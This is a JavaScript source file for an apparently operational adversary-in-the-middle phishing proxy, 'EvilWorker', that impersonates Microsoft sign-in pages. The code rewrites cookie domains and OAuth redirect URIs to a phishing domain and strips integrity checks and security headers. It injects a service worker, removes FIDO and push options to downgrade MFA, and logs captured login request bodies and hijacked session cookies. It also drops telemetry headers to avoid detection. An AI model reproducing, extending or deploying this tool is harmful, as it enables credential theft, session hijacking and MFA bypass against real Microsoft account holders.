// ============================================================
// FINAL STEALTH PROXY SERVER – EvilWorker Core + Carlos Tactics
// FIXED: Handles /api/gateway with query parameters
// ============================================================
// Customized for file paths:
//   portal_a7x9k.html, error_4m2p.html, worker_8t2r.js, assets/bundle_x9f3.js
// ============================================================
// Usage: node proxy_server.js
// Environment variables:
//   ENCRYPTION_KEY  (32-char hex, default random)
//   PHISHING_DOMAIN (your domain, e.g., app.azurewebsites.net)
//   REDIRECT_URL    (fallback, e.g., https://google.com)
//   TARGET_HOST     (real service, e.g., login.microsoftonline.com)
// ============================================================

import { createServer } from 'http';
import { request as httpsRequest } from 'https';
import { request as httpRequest } from 'http';
import { createReadStream, existsSync, mkdirSync, createWriteStream } from 'fs';
import { join } from 'path';
import { createCipheriv, randomBytes } from 'crypto';
import { gunzip, inflate, brotliDecompress, zstdDecompress, gzip, deflate, brotliCompress, zstdCompress } from 'zlib';
import { promisify } from 'util';

// ---- Promisify zlib ----
const gunzipAsync = promisify(gunzip);
const inflateAsync = promisify(inflate);
const brotliDecompressAsync = promisify(brotliDecompress);
const zstdDecompressAsync = promisify(zstdDecompress);
const gzipAsync = promisify(gzip);
const deflateAsync = promisify(deflate);
const brotliCompressAsync = promisify(brotliCompress);
const zstdCompressAsync = promisify(zstdCompress);

// ---- Configuration ----
const ENCRYPTION_KEY = process.env.ENCRYPTION_KEY || randomBytes(32).toString('hex');
const PHISHING_DOMAIN = process.env.PHISHING_DOMAIN || 'localhost';
const REDIRECT_URL = process.env.REDIRECT_URL || 'https://www.google.com';
const TARGET_HOST = process.env.TARGET_HOST || 'login.microsoftonline.com';

console.log('[CONFIG] ENCRYPTION_KEY set:', ENCRYPTION_KEY.substring(0, 8) + '...');
console.log('[CONFIG] PHISHING_DOMAIN:', PHISHING_DOMAIN);
console.log('[CONFIG] REDIRECT_URL:', REDIRECT_URL);
console.log('[CONFIG] TARGET_HOST:', TARGET_HOST);

// ---- Bidirectional domain mapping ----
const SUBDOMAIN_MAPPING = {
  [PHISHING_DOMAIN]: TARGET_HOST,
  [`login.${PHISHING_DOMAIN}`]: 'login.microsoft.com',
  [`office.${PHISHING_DOMAIN}`]: 'www.office.com',
  [`cdn.${PHISHING_DOMAIN}`]: 'aadcdn.msftauth.net',
  [`static.${PHISHING_DOMAIN}`]: 'aadcdn.msauth.net',
  [`live.${PHISHING_DOMAIN}`]: 'login.live.com'
};
const REVERSE_MAPPING = {};
for (const [phish, real] of Object.entries(SUBDOMAIN_MAPPING)) {
  REVERSE_MAPPING[real] = phish;
}

// ---- Entry point ----
const ENTRY_PATH = '/auth/start';
const TARGET_PARAM = 'dest';

// ---- File paths ----
const FILES = {
  index: 'portal_a7x9k.html',
  notFound: 'error_4m2p.html',
  script: 'assets/bundle_x9f3.js'
};
const PATHS = {
  relay: '/api/gateway',
  serviceWorker: '/worker_8t2r.js',
  script: '/assets/bundle_x9f3.js',
  nav: '/api/nav',
  session: '/api/session'
};

// ---- Logging ----
const LOG_DIR = join(process.cwd(), 'data');
if (!existsSync(LOG_DIR)) mkdirSync(LOG_DIR);
const logStreams = {};
const sessions = {};

// ============================================================
// MAIN PROXY ENGINE
// ============================================================
class StealthProxy {
  constructor() {
    this.encryptionKey = ENCRYPTION_KEY;
    this.phishingDomain = PHISHING_DOMAIN;
    this.redirectUrl = REDIRECT_URL;
    this.targetHost = TARGET_HOST;
    this.subdomainMap = SUBDOMAIN_MAPPING;
    this.reverseMap = REVERSE_MAPPING;
  }

  start(port = process.env.PORT || 3000) {
    const server = createServer(this._onRequest.bind(this));
    server.listen(port, () => console.log(`[PROXY] Running on port ${port}`));
  }

  async _onRequest(req, res) {
    const { method, url, headers } = req;
    console.log(`[REQUEST] ${method} ${url}`);

    // ---- Extract path without query ----
    const pathname = url.split('?')[0];
    const sessionId = this._getSession(headers.cookie);

    // ---- OPTIONS ----
    if (method === 'OPTIONS') {
      res.writeHead(204, {
        'Access-Control-Allow-Origin': `https://${headers.host}`,
        'Access-Control-Allow-Methods': 'GET, POST, PUT, DELETE, OPTIONS',
        'Access-Control-Allow-Headers': 'Content-Type, Authorization, Cookie, Set-Cookie',
        'Access-Control-Allow-Credentials': 'true',
        'Access-Control-Max-Age': '86400'
      });
      res.end();
      return;
    }

    // ---- Landing page ----
    if (pathname === ENTRY_PATH && url.includes(TARGET_PARAM)) {
      console.log('[REQUEST] ✅ Landing page');
      return this._serveLandingPage(req, res, url);
    }

    // ---- Known static paths ----
    if (pathname === PATHS.serviceWorker) {
      console.log('[REQUEST] ✅ Serving SW');
      return this._serveFile(res, PATHS.serviceWorker.slice(1), 'text/javascript');
    }
    if (pathname === PATHS.script) {
      console.log('[REQUEST] ✅ Serving script');
      return this._serveFile(res, FILES.script, 'text/javascript');
    }

    // ---- Relay endpoint (with or without session) ----
    if (pathname === PATHS.relay) {
      console.log('[REQUEST] ✅ Relay endpoint');
      // If there's a target parameter, handle it
      const parsed = new URL(url, `http://${headers.host}`);
      const targetParam = parsed.searchParams.get('target');
      if (targetParam) {
        console.log('[REQUEST] Relay target:', targetParam.substring(0, 60) + '...');
        // If no session, create one from the target
        if (!sessionId) {
          try {
            const target = new URL(decodeURIComponent(targetParam));
            const { name, value } = this._createSession(target);
            res.setHeader('Set-Cookie', `${name}=${value}; Max-Age=7776000; Secure; HttpOnly; SameSite=Strict`);
            sessions[name].target = {
              protocol: target.protocol,
              hostname: target.hostname,
              port: target.port || (target.protocol === 'https:' ? 443 : 80),
              path: target.pathname + target.search,
              host: target.host
            };
            console.log('[RELAY] New session created:', name);
            // Now proxy the request using the session
            return this._handleProxiedRequest(req, res, name);
          } catch (e) {
            console.log('[RELAY] Error creating session:', e.message);
          }
        } else {
          // Existing session – proxy
          return this._handleProxiedRequest(req, res, sessionId);
        }
      }
      // If no target, fallback
      console.log('[RELAY] No target, redirecting');
      res.writeHead(302, { Location: this.redirectUrl });
      res.end();
      return;
    }

    // ---- Session-only endpoints (session or nav) ----
    if (sessionId) {
      if (pathname === PATHS.session) {
        return this._handleCookieHijack(req, res, sessionId);
      }
      if (pathname === PATHS.nav) {
        return this._handleNavRewrite(req, res, sessionId);
      }
      // If it's a request from an existing session but not a known path, proxy it
      // (handles requests for CSS, JS, etc. that come after the page loads)
      console.log('[REQUEST] Proxying via session');
      return this._handleProxiedRequest(req, res, sessionId);
    }

    // ---- Fallback ----
    console.log('[REQUEST] ❌ No route – redirecting to Google');
    res.writeHead(302, { Location: this.redirectUrl });
    res.end();
  }

  // ---- Serve landing page ----
  _serveLandingPage(req, res, url) {
    try {
      const match = url.match(new RegExp(`(?<=${TARGET_PARAM}=)[^&]+`));
      if (!match) throw new Error('No target');
      const target = new URL(decodeURIComponent(match[0]));
      console.log('[LANDING] Target:', target.href);
      let sessionId = this._getSession(req.headers.cookie);
      if (!sessionId) {
        const { name, value } = this._createSession(target);
        res.setHeader('Set-Cookie', `${name}=${value}; Max-Age=7776000; Secure; HttpOnly; SameSite=Strict`);
        sessionId = name;
        console.log('[LANDING] Session created:', sessionId);
      }
      sessions[sessionId].target = {
        protocol: target.protocol,
        hostname: target.hostname,
        port: target.port || (target.protocol === 'https:' ? 443 : 80),
        path: target.pathname + target.search,
        host: target.host
      };
      res.writeHead(200, { 'Content-Type': 'text/html' });
      createReadStream(FILES.index).pipe(res);
    } catch (e) {
      console.log('[LANDING] Error:', e.message);
      res.writeHead(404);
      createReadStream(FILES.notFound).pipe(res);
    }
  }

  // ---- Serve static file ----
  _serveFile(res, filePath, mime) {
    res.writeHead(200, { 'Content-Type': mime });
    createReadStream(filePath).pipe(res);
  }

  // ---- Session management ----
  _getSession(cookieHeader) {
    if (!cookieHeader) return null;
    const cookies = cookieHeader.split('; ');
    for (const c of cookies) {
      const [name, value] = c.split('=');
      if (sessions[name] && sessions[name].value === value) return name;
    }
    return null;
  }

  _createSession(target) {
    const name = `_sess_${Math.random().toString(36).slice(2, 10)}`;
    const value = randomBytes(16).toString('hex');
    sessions[name] = { value, cookies: [], logFile: `${target.hostname}_${Date.now()}` };
    const stream = createWriteStream(join(LOG_DIR, sessions[name].logFile), { flags: 'a' });
    logStreams[name] = stream;
    return { name, value };
  }

  async _log(sessionId, data) {
    const stream = logStreams[sessionId];
    if (!stream) return;
    const iv = randomBytes(16);
    const cipher = createCipheriv('aes-256-ctr', this.encryptionKey, iv);
    const encrypted = Buffer.concat([cipher.update(JSON.stringify(data), 'utf8'), cipher.final()]);
    stream.write(JSON.stringify({ iv: iv.toString('hex'), data: encrypted.toString('hex') }) + '\n');
  }

  // ---- Main proxy handler (fetches and rewrites content) ----
  async _handleProxiedRequest(req, res, sessionId) {
    console.log('[PROXY] Handling request');
    const session = sessions[sessionId];
    if (!session) {
      console.log('[PROXY] No session');
      res.writeHead(302, { Location: this.redirectUrl });
      res.end();
      return;
    }

    const { method, headers, url } = req;
    let targetUrl;
    const parsed = new URL(url, `http://${headers.host}`);
    if (parsed.pathname === PATHS.relay) {
      const t = parsed.searchParams.get('target');
      if (t) targetUrl = new URL(decodeURIComponent(t));
    }
    if (!targetUrl) {
      const t = session.target;
      targetUrl = new URL(t.protocol + '//' + t.host + t.path);
    }
    console.log('[PROXY] Target:', targetUrl.href);

    // Domain mapping
    let targetHostname = targetUrl.hostname;
    if (this.subdomainMap[targetHostname]) {
      targetHostname = this.subdomainMap[targetHostname];
      targetUrl.hostname = targetHostname;
    }
    let effectiveHost = headers.host;
    if (this.subdomainMap[effectiveHost]) {
      effectiveHost = this.subdomainMap[effectiveHost];
    }

    // Forward request
    const options = {
      hostname: targetHostname,
      port: targetUrl.port || (targetUrl.protocol === 'https:' ? 443 : 80),
      method: method,
      path: targetUrl.pathname + targetUrl.search,
      headers: { ...headers },
      rejectUnauthorized: false
    };
    delete options.headers.host;
    options.headers.host = effectiveHost;

    const dropHeaders = [
      'x-forwarded-for', 'x-arr-log-id', 'client-ip', 'x-site-deployment-id',
      'x-canary', 'x-microsoft-telemetry', 'x-ms-telemetry', 'x-ms-request-id',
      'x-forwarded-proto', 'x-appservice-proto', 'x-arr-ssl', 'x-forwarded-tlsversion',
      'x-original-url', 'x-waws-unencoded-url', 'x-client-ip', 'x-client-port'
    ];
    for (const h of dropHeaders) delete options.headers[h];

    let bodyBuffer = [];
    req.on('data', chunk => bodyBuffer.push(chunk));
    req.on('end', async () => {
      const body = Buffer.concat(bodyBuffer);
      const proto = targetUrl.protocol === 'https:' ? httpsRequest : httpRequest;
      const proxyReq = proto(options, (proxyRes) => {
        this._log(sessionId, {
          time: new Date().toISOString(),
          url: targetUrl.href,
          method: method,
          status: proxyRes.statusCode,
          headers: proxyRes.headers,
          body: body.toString('utf8')
        }).catch(() => {});

        let isJson = proxyRes.headers['content-type']?.includes('application/json');
        let isHtml = proxyRes.headers['content-type']?.includes('text/html');
        let responseBody = [];
        proxyRes.on('data', chunk => responseBody.push(chunk));
        proxyRes.on('end', async () => {
          let fullBody = Buffer.concat(responseBody);
          let encodings = [];
          if (proxyRes.headers['content-encoding']) {
            encodings = proxyRes.headers['content-encoding'].split(',').map(e => e.trim());
            for (let enc of encodings) {
              try {
                if (enc === 'gzip') fullBody = await gunzipAsync(fullBody);
                else if (enc === 'deflate') fullBody = await inflateAsync(fullBody);
                else if (enc === 'br') fullBody = await brotliDecompressAsync(fullBody);
                else if (enc === 'zstd') fullBody = await zstdDecompressAsync(fullBody);
              } catch (e) {}
            }
          }

          // ---- MFA downgrade ----
          if (isJson && targetUrl.pathname.includes('/common/login')) {
            try {
              const json = JSON.parse(fullBody.toString('utf8'));
              if (json.arrUserProofs) {
                json.arrUserProofs = json.arrUserProofs.filter(
                  m => m.authMethodId !== 'FidoKey' && m.authMethodId !== 'PhoneAppNotification'
                );
                if (json.arrUserProofs.length === 0) {
                  json.arrUserProofs.push({
                    authMethodId: 'PhoneAppOTP',
                    data: 'PhoneAppOTP',
                    display: '',
                    isDefault: true,
                    isLocationAware: false,
                    phoneAppTypes: ['MicrosoftAuthenticatorBasedOTP']
                  });
                }
                fullBody = Buffer.from(JSON.stringify(json));
              }
            } catch (e) {}
          }

          // ---- HTML rewrite and injection ----
          if (isHtml) {
            let html = fullBody.toString('utf8');
            // SRI removal
            html = html.replace(/<script[^>]+\s+integrity="[^"]*"/g, '<script');
            html = html.replace(/<link[^>]+\s+integrity="[^"]*"/g, '<link');
            html = html.replace(/integrity\s*=\s*"[^"]*"/g, '');
            // redirect_uri rewrite
            html = html.replace(/redirect_uri=https%3A%2F%2Flogin\.microsoftonline\.com/g,
                                `redirect_uri=https%3A%2F%2F${this.phishingDomain}`);
            html = html.replace(/redirect_uri=https:\/\/login\.microsoftonline\.com/g,
                                `redirect_uri=https://${this.phishingDomain}`);
            // Inject SW registration script
            const injectCode = `
              <script>
                (async function() {
                  try {
                    await navigator.serviceWorker.register('/worker_8t2r.js', { scope: '/' });
                    console.log('SW registered');
                  } catch(e) {}
                })();
              </script>
            `;
            if (html.includes('</head>')) {
              html = html.replace('</head>', injectCode + '</head>');
            } else if (html.includes('</body>')) {
              html = html.replace('</body>', injectCode + '</body>');
            } else {
              html = injectCode + html;
            }
            fullBody = Buffer.from(html);
          }

          // ---- Cookie domain rewrite ----
          if (proxyRes.headers['set-cookie']) {
            let cookies = proxyRes.headers['set-cookie'];
            if (!Array.isArray(cookies)) cookies = [cookies];
            cookies = cookies.map(c => {
              let newC = c;
              newC = newC.replace(/Domain=\.?microsoftonline\.com/gi, `Domain=.${this.phishingDomain}`);
              newC = newC.replace(/Domain=\.?login\.microsoft\.com/gi, `Domain=.${this.phishingDomain}`);
              newC = newC.replace(/Domain=\.?login\.live\.com/gi, `Domain=.${this.phishingDomain}`);
              newC = newC.replace(/Domain=\.?aadcdn\.msftauth\.net/gi, `Domain=.${this.phishingDomain}`);
              newC = newC.replace(/Domain=\.?aadcdn\.msauth\.net/gi, `Domain=.${this.phishingDomain}`);
              return newC;
            });
            proxyRes.headers['set-cookie'] = cookies.join(', ');
          }

          // ---- Re-compress ----
          if (encodings.length) {
            for (let enc of encodings.reverse()) {
              try {
                if (enc === 'gzip') fullBody = await gzipAsync(fullBody);
                else if (enc === 'deflate') fullBody = await deflateAsync(fullBody);
                else if (enc === 'br') fullBody = await brotliCompressAsync(fullBody);
                else if (enc === 'zstd') fullBody = await zstdCompressAsync(fullBody);
              } catch (e) {}
            }
          }

          // ---- Send response ----
          const newHeaders = { ...proxyRes.headers };
          const securityHeaders = ['content-security-policy', 'x-frame-options', 'x-xss-protection', 'x-content-type-options', 'cross-origin-opener-policy', 'cross-origin-embedder-policy', 'cross-origin-resource-policy', 'permissions-policy', 'service-worker-allowed'];
          for (const h of securityHeaders) delete newHeaders[h];
          newHeaders['cache-control'] = 'no-store';
          newHeaders['access-control-allow-origin'] = `https://${req.headers.host}`;
          if (newHeaders['content-length']) {
            newHeaders['content-length'] = fullBody.length;
          }
          res.writeHead(proxyRes.statusCode, newHeaders);
          res.end(fullBody);
        });
      });

      proxyReq.on('error', (e) => {
        console.error('[PROXY] Error:', e.message);
        res.writeHead(502);
        res.end();
      });
      if (body.length) proxyReq.write(body);
      proxyReq.end();
    });
  }

  // ---- Cookie hijack ----
  async _handleCookieHijack(req, res, sessionId) {
    let body = '';
    req.on('data', chunk => body += chunk);
    req.on('end', () => {
      if (sessionId) {
        this._updateCookies(sessionId, [body], req.headers.host);
        const domains = this._getValidDomains([req.headers.host, sessions[sessionId].target.hostname]);
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify(domains));
      } else {
        res.writeHead(403);
        res.end();
      }
    });
  }

  // ---- Navigation rewrite ----
  async _handleNavRewrite(req, res, sessionId) {
    const url = new URL(req.url, `http://${req.headers.host}`);
    const targetParam = url.searchParams.get(TARGET_PARAM);
    if (!targetParam) { res.writeHead(400); return res.end(); }
    try {
      const target = new URL(decodeURIComponent(targetParam));
      if (sessionId) {
        sessions[sessionId].target = {
          protocol: target.protocol,
          hostname: target.hostname,
          port: target.port || (target.protocol === 'https:' ? 443 : 80),
          path: target.pathname + target.search,
          host: target.host
        };
      }
      const redirect = `${sessions[sessionId].target.protocol}//${req.headers.host}${sessions[sessionId].target.path}`;
      res.writeHead(302, { Location: redirect });
      res.end();
    } catch (e) {
      res.writeHead(404);
      createReadStream(FILES.notFound).pipe(res);
    }
  }

  _updateCookies(sessionId, newCookies, host) {
    const session = sessions[sessionId];
    if (!session) return;
    for (const cookie of newCookies) {
      session.cookies.push(cookie);
    }
  }

  _getValidDomains(domains) {
    const result = [];
    for (const d of domains) {
      const parts = d.split('.');
      for (let i = 2; i <= parts.length; i++) {
        const sub = parts.slice(-i).join('.');
        if (!result.includes(sub)) result.push(sub);
      }
    }
    return result;
  }
}

// ---- Start ----
const proxy = new StealthProxy();
proxy.start();
